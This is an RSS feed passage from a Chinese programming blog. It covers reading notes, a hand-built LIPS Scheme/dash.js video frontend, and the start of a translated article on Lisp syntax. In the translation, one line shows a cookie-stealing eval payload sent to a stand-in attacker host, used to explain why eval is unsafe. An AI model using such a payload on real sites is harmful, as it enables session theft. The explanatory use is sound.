id=&quot;我们不能做什么&quot;&gt;我们不能做什么&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;结构化编程对程序控制权的直接转移进行了限制和规范。&lt;/li&gt;&lt;li&gt;面向对象编程对程序控制权的间接转移进行了限制和规范。&lt;/li&gt;&lt;li&gt;函数式编程对程序中的赋值进行了限制和规范。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;这些范式主要是为了告诉我们不能做什么，而不是可以做什么。 &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt;&lt;/p&gt;&lt;p&gt;也不难理解 TypeScript 和 Python 上 type hint 出现，因为大家都想要「限制」，
+有时候没有规范只会带来一团糟。&lt;/p&gt;&lt;p&gt;文学上关于限制的例子就是格律诗了，在固定的字数中不断考虑对仗和平仄的限制反而对词语产生了凝练
+感还带来了律动感。&lt;/p&gt;&lt;h2 id=&quot;阅读&quot;&gt;阅读&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://pomb.us/build-your-own-react/&quot; class=&quot;external_link&quot;&gt;Build your own React&lt;/a&gt;: 最近通过这种文章才意识到 Javascript 生态的疯狂。转译器满天了，
+写出来的代码和实际运行的代码已经有非常大的不同了。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.oaktreecapital.com/insights/memo/is-it-a-bubble&quot; class=&quot;external_link&quot;&gt;Is It a Bubble?&lt;/a&gt;: 我很难想象一个人工智能能与当今所有在职人员并肩工作的世界，就业怎么可能不减少？
+这些消失的岗位改怎么办呢？&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://jandan.net/p/121689&quot; class=&quot;external_link&quot;&gt;越早找到人生方向的孩子，越不容易抑郁 - 煎蛋&lt;/a&gt;：人生如果真是赛跑，那么跑道也是「比谁更能先认识自己」。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.dbpro.app/blog/sqlite-json-virtual-columns-indexing&quot; class=&quot;external_link&quot;&gt;SQLite JSON Superpower: Virtual Columns + Indexing - DB Pro Blog&lt;/a&gt;: sqlite 里可以用
+json_extract 并添加虚拟列来处理 JSON 数据，这样就算用 sqlite 存储 JSON 这种文档数据也能够实现用 SQL 语句
+进行查询。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://woodrush.github.io/blog/posts/2022-01-12-lisp-in-life.html&quot; class=&quot;external_link&quot;&gt;A Lisp Interpreter Implemented in Conway’s Game of Life | Woodrush’s Blog&lt;/a&gt;: 其实并没有看完，还是挺
+深奥的。我确实感觉康威生命游戏和 lisp 之间有种说不清道不明的「暧昧联系」，可能是什么可判定问题还是什么计算理论？总之
+现在先放到一边等以后将技能点交到这个领域再过来看看。&lt;/p&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.cnbc.com/2025/12/13/youtubes-ceo-is-latest-tech-boss-limiting-his-kids-social-media-use.html&quot; class=&quot;external_link&quot;&gt;YouTube’s CEO is latest tech boss limiting his kids’ social media use&lt;/a&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.solidot.org/story?sid=83045&quot; class=&quot;external_link&quot;&gt;奇客Solidot | Reddit 指控澳大利亚禁止儿童使用社媒法侵犯自由&lt;/a&gt;：社交媒体带来了满城风雨，所幸现在有一些「小众」选择，
+例如联邦宇宙。马上就要到年末了，运营自己的实例也快四年了，想想在联邦宇宙的日子确实还是比较舒心的。除了主页轴没有
+推荐算法纯按照时间排序、能关掉新关注提醒、设置过滤器外，就是自己也能够修改一点点源代码，例如隐藏粉丝数这种尝试让社交媒
+体没那么过激的修改，现在看来效果还是挺好的。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;/li&gt;&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://cdegroot.com/programming/commonlisp/2025/11/26/cl-ql-asdf.html&quot; class=&quot;external_link&quot;&gt;Common Lisp, ASDF, and Quicklisp: packaging explained&lt;/a&gt;: 嘿，这就是我想要找的关于 common lisp 相关的一些工程
+配置教程，之前倒是有配置过一点 cl 工程但是感觉迷迷糊糊，有这样的说明文章还是挺有帮助的。&lt;/p&gt;&lt;/li&gt;&lt;/ul&gt;&lt;h2 id=&quot;Presentday,Presenttime&quot;&gt;Present day, Present time&lt;/h2&gt;&lt;p&gt;燃尽了，在周末翻译了一篇文章又写了一篇文章后感觉对于周刊已经没有什么好写的了，现在只是用着 RSS 阅读器里的收藏文章胡乱填点东西。
+看来之后还是要在每周一开始就确定好主题部分尽量早得把它放到后台处理让大脑慢慢处理啊……&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 罗伯特 C.马丁. 整洁架构之道. 机械工业出版社, 2024.&lt;/p&gt;</content:encoded></item><item><title>古法手做网页前端项目</title><guid>https://blog.southfox.me/2025/12/traditional-craftsmanship-frontend/index.html</guid><pubDate>Sun, 21 Dec 2025 15:24:00 Z</pubDate><link>https://blog.southfox.me/2025/12/traditional-craftsmanship-frontend/index.html</link><description>&lt;p&gt;马上就是 2026 年了，我仍然用着最基本的浏览器原生 ECMAScript 和 DOM 操作搓一个
+前端项目，这是怎么样的匠人精神（并不）啊！&lt;/p&gt;</description><content:encoded type="html">&lt;p&gt;马上就是 2026 年了，我仍然用着最基本的浏览器原生 ECMAScript 和 DOM 操作搓一个
+前端项目，这是怎么样的匠人精神（并不）啊！&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;硬造需求&quot;&gt;硬造需求&lt;/h2&gt;&lt;p&gt;又是到了一年的年尾， &lt;a href=&quot;https://curiositystream.com/&quot; class=&quot;external_link&quot;&gt;curiosity stream&lt;/a&gt; 这个聚焦纪录片的流媒体平台发了一封邮件说要到了续费的时候了。
+恍然发现这个流媒体平台我这一年并没有看多少，主要是官方前端太莫名奇妙了：
+用了 DASH &lt;sup&gt;&lt;a href=&quot;#1&quot; id=&quot;1r&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; 这个会根据网络状况动态切换视频清晰度的技术，
+但是所用的 dash 播放器不会遵守用户的清晰度设定一直锁定在低清晰度。&lt;/p&gt;&lt;p&gt;一开始我感到奇怪，明明我看油管的 1080P 也是没什么压力怎么到你这就一直在看糊团块呢？安卓 app 端上
+看 1080P 也是可以看的，然后我就想着要不离线下载到本地看也不是不行吧。
+搜了下发现 &lt;a href=&quot;https://github.com/yt-dlp/yt-dlp&quot; class=&quot;external_link&quot;&gt;yt-dlp&lt;/a&gt; 项目支持下载 curiosity stream 的视频。直接下载发现可以很快的速度下载视频，
+这下动了心思想着如果直接拿到视频地址放到一个我自己能控制的 dash 播放器会怎么样？&lt;/p&gt;&lt;p&gt;然后找到了 &lt;a href=&quot;https://dashjs.org/&quot; class=&quot;external_link&quot;&gt;dash.js&lt;/a&gt; 这个项目跟着文档立起了最小能工作的项目个最基本的 html 文件：
+引入 dashjs 库后在 body 标签里新开一个 script 标签写一点 Javscript 代码，带入到从控制台网络标签中 api
+返回结果挖出的 mpd 播放地址。效果令人震惊，dashjs 播放器解析完地址后直接就流畅播起了最高的 2160p 清晰度的视频流！&lt;/p&gt;&lt;p&gt;这可就有点古怪了，我的网络在 curiosity stream 确实能够跑满但是为什么在官方的网页端只能看低清晰度呢？我
+推测可能是官方的网页前端塞满了很多追踪服务，监视着我包括鼠标移动在内的一举一动。这些大批量的网络请求对我这个没做什么优化
+的代理服务队列来说是个挑战，然后就拖慢了官方 dash 播放器对网络状况「纸面数据」上的判断，加上无法锁定清晰度的助攻导致我只能
+看糊团块了。
+我自己手动拿出 mpd 播放地址放到 dashjs 播放器则能够独占所有网络而跑满速度，而且因为用得是最新的 dashjs 播
+放器，试了下发现是能够关掉自动切换清晰度设置实现真正锁定清晰度。&lt;/p&gt;&lt;p&gt;好吧，那么我能够直接从 api 挖出播放地址同时这个由 cloudflare 之类的 CDN 服务托管的播放地址并没有做什么跨域限制，
+让我能够随便从什么域名播放的话……那就干脆自己造个代替前端吧。稍微判断了一下需求：播放视频、展示一些推荐条目、点击条目可
+以播放这个条目下的视频。这个很简单的场景好像就没必要 npm 或者 react 之类的工具了。&lt;/p&gt;&lt;h2 id=&quot;古法手做&quot;&gt;古法手做&lt;/h2&gt;&lt;p&gt;那么就开始以原生的 ECMAScript 为基础做一个简易前端出来吧。挑了 &lt;a href=&quot;https://developer.mozilla.org/zh-CN/docs/Web/JavaScript&quot; class=&quot;external_link&quot;&gt;MDN&lt;/a&gt; 的 Javascript 教
+程开始看起，走马观花的的浏览了下，有点像是什么在洗手间忘带手机开始百无聊赖读起沐浴露配料表
+一样，读了几章后觉得还是直接上手吧。&lt;/p&gt;&lt;p&gt;当然就算看起 Javascript 语法教程我也没打算完全用 Javscript 写，因为半年前知道了一个
+在 Javascript 上构建 Scheme 语言的库 &lt;a href=&quot;https://lips.js.org/&quot; class=&quot;external_link&quot;&gt;LIPS&lt;/a&gt; ，所以这次想着写前端也是有点为了
+醋而去包饺子。&lt;/p&gt;&lt;p&gt;古法手做前端但古得是 Lisp 之法 &lt;sup&gt;&lt;a href=&quot;#2&quot; id=&quot;2r&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 。&lt;/p&gt;&lt;h3 id=&quot;首先是……导包&quot;&gt;首先是……导包&lt;/h3&gt;&lt;p&gt;参照 lips 的文档用 script 标签直接导入就能使用了，不过马上就遇到坑
+了： scheme 标准里 &lt;code&gt;import&lt;/code&gt; 已经有实际用途了所以 &lt;code&gt;import&lt;/code&gt; 函数是用来
+导 scheme 相关的包的，不太清楚如何在 lips 的脚本里使用其它导入的 ESM 包。最后翻找
+文档翻找 issues 终于找到了能够凑合的实现：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-scheme&quot;&gt;(define js-import (self.eval &amp;quot;(x) =&amp;gt; import(x)&amp;quot;))
+(define Dashjs (js-import &amp;quot;https://cdn.jsdelivr.net/npm/dashjs@5.1.0/dist/modern/esm/dash.all.min.js&amp;quot;))
+(define MediaPlayer (Dashjs.MediaPlayer))
+(define player (MediaPlayer.create))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样通过调用 &lt;code&gt;eval&lt;/code&gt; 这个「逃生门」也是勉强实现了在 lips 下导入并使用模块。&lt;/p&gt;&lt;h3 id=&quot;这何尝不是一种……&quot;&gt;这何尝不是一种……&lt;/h3&gt;&lt;p&gt;然后就是进行一些登录鉴权然后通过 fetch 去请求 api 操作获取到 token 之类的操作。
+在 lips 里调用相关函数真得没什么不同，无非就是 f(x) 变成了 (f x) ，例如 JavaScript 里的:&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;localStorage.setItem(&amp;quot;token&amp;quot;, ...);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;在 lips 里就成为了：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-scheme&quot;&gt;(localStorage.setItem &amp;quot;token&amp;quot; ...)&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;要用这种形式表达的理由在这篇文章也是讲得很清楚： &lt;a href=&quot;/2025/12/an-intuition-for-lisp-syntax-zh/&quot;&gt;直观理解 Lisp 语法&lt;/a&gt;&lt;/p&gt;&lt;p&gt;lisper 这种将原来在宿主语言上构建一套 lisp 的做法总感觉有点，额，这何尝不是一种 NTR 呢。&lt;/p&gt;&lt;h3 id=&quot;不是jsx而是sxml&quot;&gt;不是 jsx 而是 sxml&lt;/h3&gt;&lt;p&gt;react 搭配 jsx 这种以比较贴近 HTML 的形式去建立节点元素的方式确实比较直观，但是要配上转译器之类的操作 jsx 最后生成
+点 ECMAScript 代码的形式还是有点……吓人 &lt;sup&gt;&lt;a href=&quot;#3&quot; id=&quot;3r&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; 。&lt;/p&gt;&lt;p&gt;循其本，如果将 DOM 元素用列表表达，然后里面分成元素节点名字、属性列表、子节点。那么不难注意 &lt;sup&gt;&lt;a href=&quot;#4&quot; id=&quot;4r&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; 到这个列表是一个递归
+的表现形式，所以之后也是当然的用一个递归函数去处理这个结构，最后转换成一条条对应语句类似：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;const element = [&amp;quot;div&amp;quot;, {id: &amp;quot;foo&amp;quot;, class: &amp;quot;demo&amp;quot;},
+                 [[&amp;quot;h2&amp;quot;, {}, &amp;quot;Hello&amp;quot;],
+                  [&amp;quot;p&amp;quot;, {}, &amp;quot;Hello, World!&amp;quot;]]];
+// 最后操作成……
+let element = document.createElement(&amp;quot;div&amp;quot;);
+element.setAttribute(&amp;quot;id&amp;quot;, &amp;quot;foo&amp;quot;);
+element.setAttribute(&amp;quot;class&amp;quot;, &amp;quot;demo&amp;quot;);
+element.appendChild(
+  // let element_1 = document.createElement(&amp;quot;h2&amp;quot;);
+  // element_1.appendChild(document.createTextNode(&amp;quot;h2&amp;quot;));
+);
+element.appendChild(
+  // let element_2 = document.createElement(&amp;quot;p&amp;quot;);
+  // element_2.appendChild(document.createTextNode(&amp;quot;Hello, World!&amp;quot;));
+);&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;用 lisp 的语法表示相同的元素可以表示成这样的 sxml &lt;sup&gt;&lt;a href=&quot;#5&quot; id=&quot;5r&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; ：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-scheme&quot;&gt;(define element '(div (@ (id &amp;quot;foo&amp;quot;) (class &amp;quot;demo&amp;quot;))
+                  (h2 &amp;quot;hello&amp;quot;)
+                  (p &amp;quot;Hello, World!&amp;quot;)))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;配上这样的解析函数：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-scheme&quot;&gt;(define (make-element elem)
+  (document.createElement elem))
+
+(define (make-text-node text)
+  (document.createTextNode text))
+
+(define (add-event-listener! elem type proc)
+  (elem.addEventListener type proc))
+
+(define (append-child! elem child)
+  (elem.appendChild child))
+
+(define (set-attribute! elem attr val)
+  (elem.setAttribute (symbol-&amp;gt;string attr) val))
+
+(define (sxml-&amp;gt;dom expr)
+  (let* ((have-attrs (and (not (null? (cdr expr)))
+                          (pair? (cadr expr))
+                          (eq? (caadr expr) '@)))
+         (attrs (if have-attrs
+                    (cdadr expr)
+                    '()))
+         (rest (if have-attrs
+                   (cddr expr)
+                   (cdr expr)))
+         (symbol (car expr))
+         (name (symbol-&amp;gt;string symbol))
+         (elem (make-element (if (char-lower-case? (car (string-&amp;gt;list name)))
+                                 name
+                                 symbol))))
+    (for-each (lambda (attr val)
+                (if (procedure? val)
+                    (add-event-listener! elem attr val)
+                    (set-attribute! elem attr val)))
+      (map car attrs)
+      (map cadr attrs))
+    (if (null? rest)
+        '()
+        (let ((first (car rest)))
+          (if (pair? first)
+              (map (lambda (expr)
+                     (append-child! elem (sxml-&amp;gt;dom expr)))
+                   rest)
+              (append-child! elem (make-text-node first)))))
+    elem))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就能实现通过 sxml 创建出一个 DOM 了！这个解析函数对于没有 lisp 经验的人来说可能有点吓人，不过实际是和上面 JavaScript 语法
+的例子是一样的，无非就是用接收的列表第一个元素的符号去 &lt;code&gt;document.createElement&lt;/code&gt; ；然后判断列表第二项是否是列表第一个
+元素是不是 &lt;code&gt;@&lt;/code&gt; （是的话表示有参数）然后拿剩下列表的键值对做循环调用 &lt;code&gt;setAttribute&lt;/code&gt; 来处理元素的
+属性；然后将第三项剩余节点递归地调用 &lt;code&gt;appendChild&lt;/code&gt; 添加到一开始的元素上。&lt;/p&gt;&lt;p&gt;这个 sxml-&amp;gt;dom 函数我是从 lips 标准库拿出来改成这样的， lips 标准库内的 sxml 相关函数是
+为 &lt;code&gt;React.createElement&lt;/code&gt; 之类的框架准备的，我将其改成了使用原生的 &lt;code&gt;document.createElement&lt;/code&gt; 之类
+内建函数来创建一个节点。&lt;/p&gt;&lt;h3 id=&quot;列表中的模板&quot;&gt;列表中的模板&lt;/h3&gt;&lt;p&gt;现在有了 sxml-&amp;gt;dom 函数能够生成一个 DOM ，那么还能做到更多吗？例如一个经典的按钮点击应用：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-scheme&quot;&gt;(define (click-app)
+  (define *click* 0)
+  (sxml-&amp;gt;dom `(div (@ (id &amp;quot;container&amp;quot;))
+               (p (@ (id &amp;quot;click&amp;quot;)) ,(number-&amp;gt;string *click*))
+               (button
+                (@ (click
+                    ,(lambda (event)
+                       (set! *click* (+ 1 *click*))
+                       (element-replace-with!
+                        (get-element-by-id &amp;quot;click&amp;quot;)
+                        (sxml-&amp;gt;dom `(p (@ (id &amp;quot;click&amp;quot;)) ,(number-&amp;gt;string *click*)))))))
+                &amp;quot;click!&amp;quot;))))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;可以看到里面有一些很奇怪的东西，首先就是 sxml-&amp;gt;dom 的参数里列表以 &lt;code&gt;`&lt;/code&gt; 开头，而里面的一些列表元素又以 &lt;code&gt;,&lt;/code&gt; 开头。
+这其实是很多 lisp 里常有的 &lt;strong&gt;准引用&lt;/strong&gt; ，可以类比成各类模板中的插值。 &lt;code&gt;`&lt;/code&gt; 里所有元素都保持不变，但 &lt;code&gt;,&lt;/code&gt; 开头的会被
+执行，例如：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-scheme&quot;&gt;`(+ 1 2 ,(+ 1 2))
+;; =&amp;gt; (+ 1 2 3)
+
+(define *click* 2)
+`(p (@ (id &amp;quot;click&amp;quot;)) ,(number-&amp;gt;string *click*))
+;; =&amp;gt; (p (@ (id &amp;quot;click&amp;quot;)) 2))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;同时针对 &lt;code&gt;@&lt;/code&gt; 属性列表里面的， sxml-&amp;gt;dom 会有这样一段：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-scheme&quot;&gt;(if (procedure? val)
+    (add-event-listener! elem attr val)
+    (set-attribute! elem attr val))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;就是当值是一个过程（Scheme 里将函数称为过程）的话那么就用 &lt;code&gt;add-event-listerner!&lt;/code&gt; 这个函数设置监听而不是用属性
+设置函数设置键值，这样就达成了在属性列表分派 &lt;code&gt;setAttribute&lt;/code&gt; 或 &lt;code&gt;addEventListener&lt;/code&gt; 函数的效果。&lt;/p&gt;&lt;p&gt;因为是自己造的轮子所以 render 更新流程就直接写在监听事件的回调函数里面了，
+用 &lt;code&gt;get-element-by-id&lt;/code&gt; 手动选择元素然后就地更新回去，虽然比较麻烦但至少能用。&lt;/p&gt;&lt;h2 id=&quot;总结&quot;&gt;总结&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;项目仓库：&lt;a href=&quot;https://codeberg.org/southfox/curioda&quot; class=&quot;external_link&quot;&gt;southfox/curioda - Codeberg.org&lt;/a&gt;&lt;/li&gt;&lt;li&gt;cloudflare pages 部署地址： &lt;a href=&quot;https://curioda.pages.dev/&quot; class=&quot;external_link&quot;&gt;https://curioda.pages.dev/&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;有了上述说的一些设置也是慢慢磨出了个能用的前端出来，无非就是做点将 token 登录凭证存到 localStorage 啦、api 请求封装啦、
+一些 dom 元素操作啦等等，现在是暂时搓出了个能用的项目出来。简陋但是能用，而且播放器全屏后基本都是面对视频所以没必要太在乎
+外面的外观……吧。&lt;/p&gt;&lt;p&gt;这个前端能不能用 react 写？能。这个前端就算用 lips 库写但是可不可以结合 react ？能，甚至标准库就有
+将 sxml 配合 &lt;code&gt;React.createElement&lt;/code&gt; 函数的支持。
+但我还是对在这个浏览器就能直接加载的流程感到满意，也实在体会到了前端开发的「乐趣」，一种修改马上就能得到
+反馈的愉悦，不过转念一想，好像跟 REPL &lt;sup&gt;&lt;a href=&quot;#6&quot; id=&quot;6r&quot;&gt;6&lt;/a&gt;&lt;/sup&gt; 差不多啊。&lt;/p&gt;&lt;h2 id=&quot;Bonus&quot;&gt;Bonus&lt;/h2&gt;&lt;p&gt;lips 是一个可以从外部导入的 js 库，那么它能不能在一些更……有趣的地方运行呢？例如 Tampermonkey 这种运行用户自定
+义脚本的地方，捣鼓了一下发现真行。&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;// ==UserScript==
+// @name         New Userscript
+// @namespace    http://tampermonkey.net/
+// @version      2025-12-20
+// @description  try to take over the world!
+// @author       You
+// @match        https://*/*
+// @icon         data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==
+// @require      https://cdn.jsdelivr.net/npm/lips@beta/dist/lips.min.js
+// @grant        none
+// ==/UserScript==
+
+const script = `
+(alert &amp;quot;Hello World&amp;quot;)
+`;
+
+(async function() {
+    'use strict';
+    const exec = lips.exec;
+    await exec(script);
+})();&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;以上就是一个最小 Tampermonkey 里的运行 lips 最小概念验证脚本了，不过试了试
+因为 lips 里面的 &lt;code&gt;new Function()&lt;/code&gt; 黑魔法，在一些有特别严格设置 CSP 地方是无法运行的，不过
+依然也是解锁了新的应用场景，不清楚之后我能不能用上呢。&lt;/p&gt;&lt;h2 id=&quot;脚注&quot;&gt;脚注&lt;/h2&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#1r&quot; id=&quot;1&quot;&gt;1&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://zh.wikipedia.org/zh-cn/%E5%9F%BA%E4%BA%8EHTTP%E7%9A%84%E5%8A%A8%E6%80%81%E8%87%AA%E9%80%82%E5%BA%94%E6%B5%81&quot; class=&quot;external_link&quot;&gt;基于HTTP的动态自适应流 - 维基百科，自由的百科全书&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#2r&quot; id=&quot;2&quot;&gt;2&lt;/a&gt;&lt;/sup&gt; 笑点解析：哪怕是 Scheme 也是 1975 年就发布了 &lt;a href=&quot;https://zh.wikipedia.org/zh-cn/LISP&quot; class=&quot;external_link&quot;&gt;LISP - 维基百科，自由的百科全书&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#3r&quot; id=&quot;3&quot;&gt;3&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://pomb.us/build-your-own-react/&quot; class=&quot;external_link&quot;&gt;Build your own React&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#4r&quot; id=&quot;4&quot;&gt;4&lt;/a&gt;&lt;/sup&gt; 真不难注意！因为 HTML 文档本身就是这样的嵌套的列表结构&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#5r&quot; id=&quot;5&quot;&gt;5&lt;/a&gt;&lt;/sup&gt; 之前写的文章也提到了 sxml ，本身也有点 lisp 教学的意思在里面：&lt;a href=&quot;/2025/09/hello-haunt/&quot;&gt;Hello Haunt, 又一次换了博客框架&lt;/a&gt;&lt;/p&gt;&lt;p&gt;&lt;sup&gt;&lt;a href=&quot;#6r&quot; id=&quot;6&quot;&gt;6&lt;/a&gt;&lt;/sup&gt; &lt;a href=&quot;https://zh.wikipedia.org/zh-cn/%E8%AF%BB%E5%8F%96-%E6%B1%82%E5%80%BC-%E8%BE%93%E5%87%BA%E5%BE%AA%E7%8E%AF&quot; class=&quot;external_link&quot;&gt;读取-求值-输出循环 - 维基百科，自由的百科全书&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title>直观理解 Lisp 语法</title><guid>https://blog.southfox.me/2025/12/an-intuition-for-lisp-syntax-zh/index.html</guid><pubDate>Fri, 19 Dec 2025 14:18:00 Z</pubDate><link>https://blog.southfox.me/2025/12/an-intuition-for-lisp-syntax-zh/index.html</link><description>&lt;blockquote&gt;&lt;p&gt;这是一篇翻译文章！原文为： &lt;a href=&quot;https://stopa.io/post/265&quot; class=&quot;external_link&quot;&gt;An Intuition for Lisp Syntax&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;每个我遇到的 lisp 黑客（包括我），都觉得 lisp 里那些括号让人反感又奇怪，当然，只在一开始。很快我们就顿悟
+到了同一个事： lisp 的力量就在这些括号里！在这篇文章中，我们将踏上通往这条顿悟之路。&lt;/p&gt;</description><content:encoded type="html">&lt;blockquote&gt;&lt;p&gt;这是一篇翻译文章！原文为： &lt;a href=&quot;https://stopa.io/post/265&quot; class=&quot;external_link&quot;&gt;An Intuition for Lisp Syntax&lt;/a&gt;&lt;/p&gt;&lt;/blockquote&gt;&lt;p&gt;每个我遇到的 lisp 黑客（包括我），都觉得 lisp 里那些括号让人反感又奇怪，当然，只在一开始。很快我们就顿悟
+到了同一个事： lisp 的力量就在这些括号里！在这篇文章中，我们将踏上通往这条顿悟之路。&lt;/p&gt;&lt;span id=&quot;more&quot;&gt;&lt;/span&gt;&lt;h2 id=&quot;绘画&quot;&gt;绘画&lt;/h2&gt;&lt;p&gt;假设现在让你写程序画点东西。如果我们用 JavaScript 编写，那我们可能有这些函数：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;drawPoint({x: 0, y: 1}, 'yellow')
+drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'blue')
+drawCircle(point, radius, 'red')
+rotate(shape, 90)
+...&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;目前为止还不错。&lt;/p&gt;&lt;h2 id=&quot;挑战&quot;&gt;挑战&lt;/h2&gt;&lt;p&gt;现在挑战来了：我们能支持远程绘图吗？&lt;/p&gt;&lt;p&gt;这意味者用户可能会「发送」一些指令到你的屏幕上，然后让你看到他们的绘画过程。&lt;/p&gt;&lt;p&gt;该怎么做呢？&lt;/p&gt;&lt;p&gt;嗯，如果我们设置了一个 websocket 链接，我们可以像这样接收用户发送的指令：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;websocket.onMessage(data =&amp;gt; {
+  /* TODO */
+})&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;Eval&quot;&gt;Eval&lt;/h2&gt;&lt;p&gt;为了让它马上运作，一种方式是直接读取并运行输入进来的代码：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;websocket.onMessage(data =&amp;gt; {
+  eval(data)
+})&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这样用户就可以发送 &lt;code&gt;&amp;quot;drawLine({x: 0, y: 0}, {x: 1, y: 1}, 'red')&amp;quot;&lt;/code&gt; 之后就会嘣：画出一条线！&lt;/p&gt;&lt;p&gt;但……你可能现在就脊背发凉了，如果恶意用户发送了这样的指令：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;window.location='http://iwillp3wn.com?user_info=' + document.cookie&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;啊哦，我们的 cookie 会被发送到 iwillp3wn.com 然后我们就被黑了。我们不能用 eval ，太危险了。&lt;/p&gt;&lt;p&gt;这就是问题所在：我们不能用 eval 但需要某种方式接受任意的指令。&lt;/p&gt;&lt;h2 id=&quot;初步想法&quot;&gt;初步想法&lt;/h2&gt;&lt;p&gt;那么，我们可以用 JSON 来表示这些指令，将这些 JSON 映射到一个特殊的函数然后控制运行的内容。
+这是一种表现方式：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;{
+  instructions: [
+    { functionName: &amp;quot;drawLine&amp;quot;, args: [{ x: 0, y: 0 }, { x: 1, y: 1 }, &amp;quot;blue&amp;quot;] },
+  ];
+}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个 JSON 会被转换成 &lt;code&gt;drawLine({x: 0, y: 0}, {x: 1, y: 1},&amp;quot;blue&amp;quot;)&lt;/code&gt; 。&lt;/p&gt;&lt;p&gt;实现这种转换也相当简单，我们的 onMessage 可能看起来像：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;webSocket.onMessage(instruction =&amp;gt; {
+  const fns = {
+    drawLine: drawLine,
+    ...
+  };
+  data.instructions.forEach((ins) =&amp;gt; fns[ins.functionName](...ins.args));
+})&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;看起来至少能用！&lt;/p&gt;&lt;h2 id=&quot;初步简化&quot;&gt;初步简化&lt;/h2&gt;&lt;p&gt;让我们看看能不能更简洁一点，现在的 JSON ：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;{
+  instructions: [
+    { functionName: &amp;quot;drawLine&amp;quot;, args: [{ x: 0, y: 0 }, { x: 1, y: 1 }, &amp;quot;blue&amp;quot;] },
+  ];
+}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;嗯，因为每个指令都有一个 functionName 和 args ，我们就不需要特别指明了，我们可以写成这样：&lt;/p&gt;&lt;pre&gt;&lt;code class=&quot;language-javascript&quot;&gt;{
+  instructions: [[&amp;quot;drawLine&amp;quot;, { x: 0, y: 0 }, { x: 1, y: 1 }, &amp;quot;blue&amp;quot;]],
